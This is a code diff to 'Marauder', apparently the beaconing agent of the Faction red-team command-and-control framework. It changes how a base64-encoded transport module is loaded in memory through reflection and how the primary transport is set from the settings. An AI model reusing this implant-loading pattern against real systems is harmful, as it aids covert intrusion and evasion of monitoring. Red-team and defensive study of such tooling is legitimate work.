@@ -22,7 +22,7 @@ namespace Marauder
       Dictionary<string, string> settings = JsonConvert.DeserializeObject<Dictionary<string, string>>((new StreamReader(settingsStream)).ReadToEnd());
       State.PayloadName = settings["PayloadName"];
       State.Password = settings["Password"];
-      State.InitialTransport = settings["Transport"];
+      State.TransportModule = settings["TransportModule"];
       State.Sleep = Int32.Parse(settings["BeaconInterval"]);
       State.Jitter = Double.Parse(settings["Jitter"]);
 
@@ -54,17 +54,19 @@ namespace Marauder
 
       Logging.Write("Main", String.Format("Creating Transport.."));
 #endif
-      byte[] transportByte = Convert.FromBase64String(State.InitialTransport);
-      Assembly transportAssembly = Assembly.Load(transportByte);
-      Type transportType = transportAssembly.GetType("Faction.Modules.Dotnet.Common.Transport");
-      var activatedTransport = Activator.CreateInstance(transportType);
-      AgentTransport initialTransport = (AgentTransport)activatedTransport;
-#if DEBUG
-      Logging.Write("Main", $"Loaded Transport Type: {initialTransport.Name}");
-#endif
+      byte[] moduleBytes = Convert.FromBase64String(State.TransportModule);
+      Assembly assembly = Assembly.Load(moduleBytes);
+      Type type = assembly.GetType("Faction.Modules.Dotnet.Initialize");
+      MethodInfo method = type.GetMethod("GetTransports");
+      object instance = Activator.CreateInstance(type, null);
+      var transports = method.Invoke(instance, null);
+
       State.TransportService = new TransportService();
-      State.TransportService.AddTransport(initialTransport);
-      State.TransportService.SetPrimaryTransport(initialTransport.Name);
+      State.TransportService.AddTransport((List<AgentTransport>)transports);
+      State.TransportService.SetPrimaryTransport(settings["InitialTransportType"]);
+#if DEBUG
+      Logging.Write("Main", $"Loaded Transport Type: {settings["InitialTransportType"]}");
+#endif
 
 #if DEBUG      
       Logging.Write("Main", "Creating Services..");
